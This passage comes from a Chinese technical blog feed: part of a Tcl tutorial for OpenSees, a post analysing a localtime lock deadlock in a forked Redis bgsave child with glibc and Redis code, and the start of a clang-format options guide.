plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; list 1 2 &#123;3 4&#125;</span><br><span class="line">1 2 &#123;3 4&#125;</span><br></pre></td></tr></table></figure><h4 id="2-6-2、concat命令"><a href="#2-6-2、concat命令" class="headerlink" title="2.6.2、concat命令"></a>2.6.2、concat命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat list ?list...?</span><br></pre></td></tr></table></figure><p>这个命令把多个list合成一个list，每个list变成新list的一个元素。</p><h4 id="2-6-3、lindex命令"><a href="#2-6-3、lindex命令" class="headerlink" title="2.6.3、lindex命令"></a>2.6.3、lindex命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lindex list index</span><br></pre></td></tr></table></figure><p>返回list的第index个(0-based)元素。例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; lindex  &#123;1 2 &#123;3 4&#125;&#125; 2</span><br><span class="line">3 4</span><br></pre></td></tr></table></figure><h4 id="2-6-4-、lappend命令"><a href="#2-6-4-、lappend命令" class="headerlink" title="2.6.4 、lappend命令"></a>2.6.4 、lappend命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lappend varname value ?value...?</span><br></pre></td></tr></table></figure><p>把每个value的值作为一个元素附加到变量varname后面，并返回变量的新值，如果varname不存在，就生成这个变量。例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; lappend  a  1 2 3</span><br><span class="line">1 2 3</span><br><span class="line">OpenSees &gt; set a</span><br><span class="line">1 2 3</span><br></pre></td></tr></table></figure><h2 id="三、控制流"><a href="#三、控制流" class="headerlink" title="三、控制流"></a>三、控制流</h2><p>TCL中的控制流和C语言类似，包括if、while、for、foreach、switch、break、continue等命令。下面分别介绍。</p><h3 id="3-1、if命令"><a href="#3-1、if命令" class="headerlink" title="3.1、if命令"></a>3.1、if命令</h3><p>单个if命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if &#123; $x&gt;0 &#125; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if-else组合命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if &#123; $x&gt;0 &#125; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; elseif &#123; $x&lt;-2 &#125; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2、while命令"><a href="#3-2、while命令" class="headerlink" title="3.2、while命令"></a>3.2、while命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while  &#123; $x&gt;0 &#125;  &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3、for命令"><a href="#3-3、for命令" class="headerlink" title="3.3、for命令"></a>3.3、for命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for &#123;set i 0&#125;  &#123; $i&lt;10 &#125;  &#123;incr i 2&#125; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>for后面加三个花括号。与C语言中的for命令类似，第一个花括号中初始化变量的值，示例中为变量 <code>i</code> 赋初值 <code>0</code> ，第二个花括号中为循环进行下去的条件。示例中如果不满足 <code>$i&lt;10</code> 这一条件就会退出循环。第三个花括号中为每次循环后要执行的语句，示例中对变量 <code>i</code> 的值加2。</p><h3 id="3-4、foreach命令"><a href="#3-4、foreach命令" class="headerlink" title="3.4、foreach命令"></a>3.4、foreach命令</h3><p>示例1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach i  &#123;a b c d&#125; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一语句循环4次，循环体中i的值分别为 <code>a</code> ， <code>b</code> ， <code>c</code> ， <code>d</code> 。</p><h2 id="四、source命令"><a href="#四、source命令" class="headerlink" title="四、source命令"></a>四、source命令</h2><p>source命令读一个文件并把这个文件的内容作为一个脚本进行求值。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source e:/hello.TCL</span><br></pre></td></tr></table></figure><p>注意这里的路径采用的是 <code>/</code> 而不是Windows中的 <code>\</code> 。</p><h2 id="五、过程-procedure"><a href="#五、过程-procedure" class="headerlink" title="五、过程(procedure)"></a>五、过程(procedure)</h2><p>TCL支持过程的定义和调用，在TCL中,过程可以看作是用TCL脚本实现的命令，效果与TCL的固有命令相似。我们可以在任何时候使用proc命令定义自己的过程，TCL中的过程类似于C中的函数。</p><p>在OpenSees脚本中，使用过程可以把一部分语句 <code>封装</code> 起来，方便多次引用。建议多使用过程。</p><p>TCL中过程是由proc命令产生的。示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proc add &#123;x y&#125; &#123;</span><br><span class="line">    expr $x+$y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>proc命令的第一个参数是你要定义的过程的名字，第二个参数是过程的参数列表，参数之间用空格隔开，第三个参数是一个TCL脚本，代表过程体。proc生成一个新的命令，可以象固有命令一样调用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; add 1 2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><p>在定义过程时，你可以利用return命令在任何地方返回你想要的值。 return命令迅速中断过程，并把它的参数作为过程的结果。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proc abs &#123;x&#125; &#123;</span><br><span class="line">    if &#123;$x &gt;= 0&#125; &#123; return $x &#125;</span><br><span class="line">    return [expr -$x]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过程的返回值是过程体中最后执行的那条命令的返回值。可以用如下方法调用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenSees &gt; set a [abs -3]</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h2 id="六、文件读写"><a href="#六、文件读写" class="headerlink" title="六、文件读写"></a>六、文件读写</h2><p>TCL提供了丰富的文件操作的命令。通过这些命令你可以对文件名进行操作(查找匹配某一模式的文件)、以顺序或随机方式读写文件、检索系统保留的文件信息（如最后访问时间)。</p><h3 id="6-1、文件名"><a href="#6-1、文件名" class="headerlink" title="6.1、文件名"></a>6.1、文件名</h3><p>TCL中文件名和我们熟悉的windows表示文件的方法有一些区别：在表示文件的目录结构时它使用 <code>/</code> ，而不是 <code>\</code> ，这和TCL最初是在UNIX下实现有关。比如C盘TCL目录下的文件sample.TCL在TCL中这样表示： <code>C:/TCL/sample.TCL</code> 。</p><h3 id="6-2、写文件示例"><a href="#6-2、写文件示例" class="headerlink" title="6.2、写文件示例"></a>6.2、写文件示例</h3><p>所以本教程中只介绍写文件的方法。如果想要了解读取文件的方法，请参考 <a href="http://www.tcl.tk/man/TCL/TCLCmd/open.htm">TCL文件读写文档</a> 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set f [open hello.txt w]</span><br><span class="line">puts $f &quot;Hello, world!&quot;</span><br><span class="line">close $f</span><br></pre></td></tr></table></figure><h3 id="6-3、open命令"><a href="#6-3、open命令" class="headerlink" title="6.3、open命令"></a>6.3、open命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open &quot;hello.txt&quot; &quot;r&quot;</span><br></pre></td></tr></table></figure><p>open命令 以”r”方式打开文件”hello.txt”。返回供其他命令(gets,close等)使用的文件标识。</p><p>文件的打开方式和我们熟悉的C语言类似，有以下方式：</p><table><thead><tr><th align="center">方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">r</td><td align="left">只读方式打开。文件必须已经存在。这是默认方式。</td></tr><tr><td align="center">r+</td><td align="left">读写方式打开，文件必须已经存在。</td></tr><tr><td align="center">w</td><td align="left">只写方式打开文件，如果文件存在则清空文件内容，否则创建一新的空文件。</td></tr><tr><td align="center">w+</td><td align="left">读写方式打开文件，如文件存在则清空文件内容，否则创建新的空文件。</td></tr><tr><td align="center">a</td><td align="left">只写方式打开文件，文件必须存在，并把指针指向文件尾。</td></tr><tr><td align="center">a+</td><td align="left">读写方式打开文件，并把指针指向文件尾。如文件不存在，创建新的空文件。</td></tr></tbody></table><p>open命令返回一个字符串用于表识打开的文件。当调用别的命令（如：gets,puts,close）对打开的文件进行操作时，就可以使用这个文件标识符。</p><h3 id="6-4、puts命令"><a href="#6-4、puts命令" class="headerlink" title="6.4、puts命令"></a>6.4、puts命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts $f &quot;Hello, world!&quot;</span><br></pre></td></tr></table></figure><p>puts命令把”Hello, world!”字符串写到 <code>$f</code> 中，如果命令中不输入 <code>$f</code> 则输出到控制台。</p><h3 id="6-5、close命令"><a href="#6-5、close命令" class="headerlink" title="6.5、close命令"></a>6.5、close命令</h3><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">close $f</span><br></pre></td></tr></table></figure><p>关闭标识为 <code>$f</code> 的文件，命令返回值为一空字符串。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> Notes </tag>
            
            <tag> TCL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>localtime函数死锁分析</title>
      <link href="/2019/01/12/localtime/"/>
      <url>/2019/01/12/localtime/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>前段时间，线上的redis实例出现了一些异常的情况，具体变现就是bgsave子进程hang住了，从而引发了后续的很多问题，通过排查最终发现是<code>localtime</code>相关函数引起的，这里做一下总结记录。</p><p>C 库函数 *<em>struct tm *localtime(const time_t <em>timer)</em></em> 作用是根据本地时区信息将 <strong>time</strong> 函数获取的 <strong>UTC</strong> 时间调整为为本地时间，并将具体的时间信息填充到tm结构体之中；</p><h1 id="二、详细介绍"><a href="#二、详细介绍" class="headerlink" title="二、详细介绍"></a>二、详细介绍</h1><p>由于localtime函数的具体底层实现的缘由，在某些场景下会触发localtime函数导致的死锁问题，这里详细的分析原因以及后续的处理方案；</p><h2 id="2-1-底层实现分析"><a href="#2-1-底层实现分析" class="headerlink" title="2.1 底层实现分析"></a>2.1 底层实现分析</h2><p><code>localtime</code>函数底层的调用栈信息为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">localtime()   =&gt;   __tz_convert()</span><br></pre></td></tr></table></figure><ul><li><code>localtime</code> 函数的底层代码实现（代码位于<code>./time/localtime.c</code>）：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Return the `struct tm&#x27; representation of *T in local time.  */</span></span><br><span class="line"><span class="keyword">struct</span> tm *</span><br><span class="line"><span class="title function_">localtime</span> <span class="params">(<span class="type">const</span> <span class="type">time_t</span> *t)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __tz_convert (t, <span class="number">1</span>, &amp;_tmbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>__tz_convert</code> 函数的底层代码实现（代码位于<code>./time/tzset.c</code>）：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Return the `struct tm&#x27; representation of *TIMER in the local timezone.</span></span><br><span class="line"><span class="comment">   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *</span></span><br><span class="line"><span class="class">__<span class="title">tz_convert</span> (<span class="title">const</span> <span class="title">time_t</span> *<span class="title">timer</span>, <span class="title">int</span> <span class="title">use_localtime</span>, <span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">tp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> leap_correction;</span><br><span class="line">  <span class="type">int</span> leap_extra_secs;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (timer == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (tzset_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Update internal database according to current TZ setting.</span></span><br><span class="line"><span class="comment">     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.</span></span><br><span class="line"><span class="comment">     This is a good idea since this allows at least a bit more parallelism.  */</span></span><br><span class="line">  tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__use_tzfile)</span><br><span class="line">    __tzfile_compute (*timer, use_localtime, &amp;leap_correction,</span><br><span class="line">      &amp;leap_extra_secs, tp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! __offtime (timer, <span class="number">0</span>, tp))</span><br><span class="line">tp = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">__tz_compute (*timer, tp, use_localtime);</span><br><span class="line">      leap_correction = <span class="number">0L</span>;</span><br><span class="line">      leap_extra_secs = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (tzset_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tp)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! use_localtime)</span><br><span class="line">&#123;</span><br><span class="line">  tp-&gt;tm_isdst = <span class="number">0</span>;</span><br><span class="line">  tp-&gt;tm_zone = <span class="string">&quot;GMT&quot;</span>;</span><br><span class="line">  tp-&gt;tm_gmtoff = <span class="number">0L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__offtime (timer, tp-&gt;tm_gmtoff - leap_correction, tp))</span><br><span class="line">        tp-&gt;tm_sec += leap_extra_secs;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">tp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解释分析：</strong></p><p><code>__tz_convert</code> 使用的是一个<code>static</code>变量的<code>tzset_lock</code>全局锁；</p><ul><li>线程安全？：由于使用直接返回的是一个全局变量，这里并不是线程安全的；</li><li>信号安全？：<code>localtime</code>与<code>localtime_r</code>这两个函数都不是信号安全的，如果在信号处理函数中使用，就要考虑到死锁的情况，比如，程序调用<code>localtime_r</code>，加锁后信号发生，信号处理函数中也调用<code>localtime_r</code>的话，会因为获取不到锁所以一直阻塞；</li></ul><p><strong>对于线上资源出现异常的分析</strong></p><p>对于redis类资源，本身存在一个主线程以及一些bio线程，对于bio线程来说，输出日志是很常见的事情，但是存在这么一种场景，当父进程中其中一个bio线程正在输出日志，此时fork了一个子进程开始执行bgsave，由于子进程会继承父进程的锁，所以对于子进程来说，当它尝试输出有一些日志的信息，就会由于已经拥有一个锁而导致出现死锁的情况，进而导致子进程会出现hang住的情况。</p><h2 id="2-2-解决方案"><a href="#2-2-解决方案" class="headerlink" title="2.2 解决方案"></a>2.2 解决方案</h2><p>使用全局变量的方式<code>timezone</code>以及<code>daylight</code>的相关信息，避免调用<code>localtime</code>函数；</p><p>方案参考（redis的官方解决方案）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">is_leap_year</span><span class="params">(<span class="type">time_t</span> year)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (year % <span class="number">4</span>) <span class="keyword">return</span> <span class="number">0</span>;         <span class="comment">/* A year not divisible by 4 is not leap. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (year % <span class="number">100</span>) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">/* If div by 4 and not 100 is surely leap. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (year % <span class="number">400</span>) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* If div by 100 *and* 400 is not leap. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;                  <span class="comment">/* If div by 100 and not by 400 is leap. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">nolocks_localtime</span><span class="params">(<span class="keyword">struct</span> tm *tmp, <span class="type">time_t</span> t, <span class="type">time_t</span> tz, <span class="type">int</span> dst)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">time_t</span> secs_min = <span class="number">60</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">time_t</span> secs_hour = <span class="number">3600</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">time_t</span> secs_day = <span class="number">3600</span>*<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">    t -= tz;                            <span class="comment">/* Adjust for timezone. */</span></span><br><span class="line">    t += <span class="number">3600</span>*dst;                      <span class="comment">/* Adjust for daylight time. */</span></span><br><span class="line">    <span class="type">time_t</span> days = t / secs_day;         <span class="comment">/* Days passed since epoch. */</span></span><br><span class="line">    <span class="type">time_t</span> seconds = t % secs_day;      <span class="comment">/* Remaining seconds. */</span></span><br><span class="line"></span><br><span class="line">    tmp-&gt;tm_isdst = dst;</span><br><span class="line">    tmp-&gt;tm_hour = seconds / secs_hour;</span><br><span class="line">    tmp-&gt;tm_min = (seconds % secs_hour) / secs_min;</span><br><span class="line">    tmp-&gt;tm_sec = (seconds % secs_hour) % secs_min;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 1/1/1970 was a Thursday, that is, day 4 from the POV of the tm structure</span></span><br><span class="line"><span class="comment">     * where sunday = 0, so to calculate the day of the week we have to add 4</span></span><br><span class="line"><span class="comment">     * and take the modulo by 7. */</span></span><br><span class="line">    tmp-&gt;tm_wday = (days+<span class="number">4</span>)%<span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Calculate the current year. */</span></span><br><span class="line">    tmp-&gt;tm_year = <span class="number">1970</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Leap years have one day more. */</span></span><br><span class="line">        <span class="type">time_t</span> days_this_year = <span class="number">365</span> + is_leap_year(tmp-&gt;tm_year);</span><br><span class="line">        <span class="keyword">if</span> (days_this_year &gt; days) <span class="keyword">break</span>;</span><br><span class="line">        days -= days_this_year;</span><br><span class="line">        tmp-&gt;tm_year++;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp-&gt;tm_yday = days;  <span class="comment">/* Number of day of the current year. */</span></span><br><span class="line">    <span class="comment">/* We need to calculate in which month and day of the month we are. To do</span></span><br><span class="line"><span class="comment">     * so we need to skip days according to how many days there are in each</span></span><br><span class="line"><span class="comment">     * month, and adjust for the leap year that has one more day in February. */</span></span><br><span class="line">    <span class="type">int</span> mdays[<span class="number">12</span>] = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    mdays[<span class="number">1</span>] += is_leap_year(tmp-&gt;tm_year);</span><br><span class="line"></span><br><span class="line">    tmp-&gt;tm_mon = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(days &gt;= mdays[tmp-&gt;tm_mon]) &#123;</span><br><span class="line">        days -= mdays[tmp-&gt;tm_mon];</span><br><span class="line">        tmp-&gt;tm_mon++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tmp-&gt;tm_mday = days+<span class="number">1</span>;  <span class="comment">/* Add 1 since our &#x27;days&#x27; is zero-based. */</span></span><br><span class="line">    tmp-&gt;tm_year -= <span class="number">1900</span>;   <span class="comment">/* Surprisingly tm_year is year-1900. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LOCALTIME_TEST_MAIN</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* Obtain timezone and daylight info. */</span></span><br><span class="line">    tzset(); <span class="comment">/* Now &#x27;timezome&#x27; global is populated. */</span></span><br><span class="line">    <span class="type">time_t</span> t = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">aux</span> =</span> localtime(&amp;t);</span><br><span class="line">    <span class="type">int</span> daylight_active = aux-&gt;tm_isdst;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">tm</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    nolocks_localtime(&amp;tm,t,timezone,daylight_active);</span><br><span class="line">    strftime(buf,<span class="keyword">sizeof</span>(buf),<span class="string">&quot;%d %b %H:%M:%S&quot;</span>,&amp;tm);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[timezone: %d, dl: %d] %s\n&quot;</span>, (<span class="type">int</span>)timezone, (<span class="type">int</span>)daylight_active, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="三、相关函数解析"><a href="#三、相关函数解析" class="headerlink" title="三、相关函数解析"></a>三、相关函数解析</h1><h2 id="3-1-time"><a href="#3-1-time" class="headerlink" title="3.1 time()"></a>3.1 time()</h2><p><code>time</code>函数会返回从公元 1970 年1 月1 日的<code>UTC 时间</code>从0 时0 分0 秒算起到现在所经过的秒数。如果 t 并非空指针的话，此函数也会将返回值存到t 指针所指的内存；</p><p><strong>函数声明：</strong><code>time_t time(time_t *t)</code></p><p><strong>返回值：</strong>成功则返回秒数，失败则返回((time_t)-1)值，错误原因存于errno 中；</p><h2 id="3-2-gettimeofday"><a href="#3-2-gettimeofday" class="headerlink" title="3.2 gettimeofday()"></a>3.2 gettimeofday()</h2><p><code>gettimeofday()</code> 函数会将目前的时间存储在 tv 所指的结构中，将当地时区的信息则放到 tz 所指的结构中并返回；</p><p><strong>函数声明：</strong><code>int gettimeofday (struct timeval * tv, struct timezone * tz)</code></p><p><strong>结构体定义：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> tv_sec;  <span class="comment">//秒</span></span><br><span class="line">    <span class="type">long</span> tv_usec;  <span class="comment">//微秒</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> tz_minuteswest;  <span class="comment">//和Greenwich 时间差了多少分钟</span></span><br><span class="line">    <span class="type">int</span> tz_dsttime;  <span class="comment">//日光节约时间的状态</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>tz_dsttime</code>所代表的状态信息为：</p><ul><li>DST_NONE  &#x2F;&#x2F;不使用</li><li>DST_USA  &#x2F;&#x2F;美国</li><li>DST_AUST  &#x2F;&#x2F;澳洲</li><li>DST_WET  &#x2F;&#x2F;西欧</li><li>DST_MET  &#x2F;&#x2F;中欧</li><li>DST_EET  &#x2F;&#x2F;东欧</li><li>DST_CAN  &#x2F;&#x2F;加拿大</li><li>DST_GB  &#x2F;&#x2F;大不列颠</li><li>DST_RUM  &#x2F;&#x2F;罗马尼亚</li><li>DST_TUR  &#x2F;&#x2F;土耳其</li><li>DST_AUSTALT  &#x2F;&#x2F;澳洲(1986 年以后)</li></ul><p><strong>返回值：</strong>成功则返回0，失败返回－1，错误代码存于errno；</p><h2 id="3-3-setlocale"><a href="#3-3-setlocale" class="headerlink" title="3.3 setlocale()"></a>3.3 setlocale()</h2><p>C 库函数 -  *<em>char *setlocale(int category, const char <em>locale)</em></em> 设置或读取地域化信息；</p><p><strong>函数声明：</strong><code>char *setlocale(int category, const char *locale)</code></p><ul><li>category – 这是一个已命名的常量，指定了受区域设置影响的函数类别；<ul><li>LC_ALL 包括下面的所有选项；</li><li>LC_COLLATE 字符串比较。参见 strcoll()；</li><li>LC_CTYPE 字符分类和转换。例如 strtoupper()；</li><li>LC_MONETARY 货币格式，针对 localeconv()；</li><li>LC_NUMERIC 小数点分隔符，针对 localeconv()；</li><li>LC_TIME 日期和时间格式，针对 strftime()；</li><li>LC_MESSAGES 系统响应；</li></ul></li><li>locale – 如果 locale 是 NULL 或空字符串 “”，则区域名称将根据环境变量值来设置，其名称与上述的类别名称相同；</li></ul><p><strong>返回值：</strong>如果成功调用 setlocale()，则返回一个对应于区域设置的不透明的字符串。如果请求无效，则返回值是 NULL</p><h2 id="3-4-tzset"><a href="#3-4-tzset" class="headerlink" title="3.4 tzset()"></a>3.4 tzset()</h2><p>C 库函数 -  *<em>char *setlocale(int category, const char <em>locale)</em></em> 设置或读取地域化信息，<code>tzset</code>函数在实现的时候是通过内部的<code>tzset_internal</code>函数来完成的；</p><p><strong>调用方式：</strong></p><ul><li>显式调用：直接执行<code>tzset</code>函数。显式调用内部的<code>tzset_internal</code>函数，强制<code>tzset</code>不管何种情况一律重新加载<code>TZ</code>信息或者<code>/etc/localtime</code>信息；</li><li>隐式调用：执行<code>localtime</code>的时候会隐式调用<code>tzset</code>函数。隐式调用内部的<code>tzset_internal</code>函数，只有在<code>TZ</code>发生变化，或者加载文件名发生变化的时候才会再次加载时区信息【如果只是<code>/etc/localtime</code>的内容发生了变化，而文件名<code>/etc/localtime</code>没有变化，则不会再次加载时区信息，导致<code>localtime</code>函数调用仍然以老时区转换UTC时间到本地时间】；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> C/C++ </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CLang-Format格式化工具</title>
      <link href="/2019/01/08/clang-format/"/>
      <url>/2019/01/08/clang-format/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h1><p><code>Clang-Format</code>是基于 clang 的一个命令行工具，这个工具能够自动化格式C&#x2F;C++&#x2F;Obj-C代码，支持多种代码风格（Google, Chromium, LLVM, Mozilla, WebKit），同时也支持自定义风格（通过编写<code>.clang-format</code>文件）；</p><h1 id="二、安装方式"><a href="#二、安装方式" class="headerlink" title="二、安装方式"></a>二、安装方式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mac</span></span><br><span class="line">brew install clang-format</span><br></pre></td></tr></table></figure><h1 id="三、参数解析"><a href="#三、参数解析" class="headerlink" title="三、参数解析"></a>三、参数解析</h1><p>官方文档的参数解析为：<a href="http://clang.llvm.org/docs/ClangFormatStyleOptions.html">http://clang.llvm.org/docs/ClangFormatStyleOptions.html</a></p><h2 id="3-1-参数解析"><a href="#3-1-参数解析" class="headerlink" title="3.1 参数解析"></a>3.1 参数解析</h2><p>BasedOnStyle样式信息：</p><ul><li><code>LLVM</code>：一种遵循<a href="https://link.jianshu.com/?t=http://llvm.org/docs/CodingStandards.html">LLVM coding standards</a>的样式；</li><li><code>Google</code>：一种遵循<a href="https://link.jianshu.com/?t=http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml">Google’s C++ style guide</a>的样式；</li><li><code>Chromium</code>：一种遵循<a href="https://link.jianshu.com/?t=http://www.chromium.org/developers/coding-style">Chromium’s style guide</a>的样式；</li><li><code>Mozilla</code>：一种遵循<a href="https://link.jianshu.com/?t=https://developer.mozilla.org/en-US/docs/Developer_Guide/Coding_Style">Mozilla’s style guide</a>的样式；</li><li><code>WebKit</code>：一种遵循<a href="https://link.jianshu.com/?t=http://www.webkit.org/coding/coding-style.html">WebKit’s style guide</a>的样式；</li></ul><h2 id="3-2-详细参数信息"><a href="#3-2-详细参数信息" class="headerlink" title="3.2 详细参数信息"></a>3.2 详细参数信息</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="comment"># 语言</span></span><br><span class="line">Language:        Cpp</span><br><span class="line"><span class="comment"># BasedOnStyle:  LLVM</span></span><br><span class="line"><span class="comment">#类的访问修饰关键字(private,public,protected···)缩进 </span></span><br><span class="line"><span class="comment"># private:</span></span><br><span class="line"><span class="comment"># int a;</span></span><br><span class="line"><span class="comment"># 1表示不缩进</span></span><br><span class="line"><span class="comment"># 大于1的值表示访问修饰关键字的左侧从int a的左侧列开始往右侧移动的距离</span></span><br><span class="line">AccessModifierOffset: -2</span><br><span class="line"><span class="comment"># 在未封闭(括号的开始和结束不在同一行)的括号中的代码是否对齐</span></span><br><span class="line"><span class="comment"># if(a &amp;;&amp;;</span></span><br><span class="line"><span class="comment">#b)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">AlignAfterOpenBracket: Align</span><br><span class="line"><span class="comment"># 多行赋值语句按 = 号对齐</span></span><br><span class="line">AlignConsecutiveAssignments: <span class="literal">false</span></span><br><span 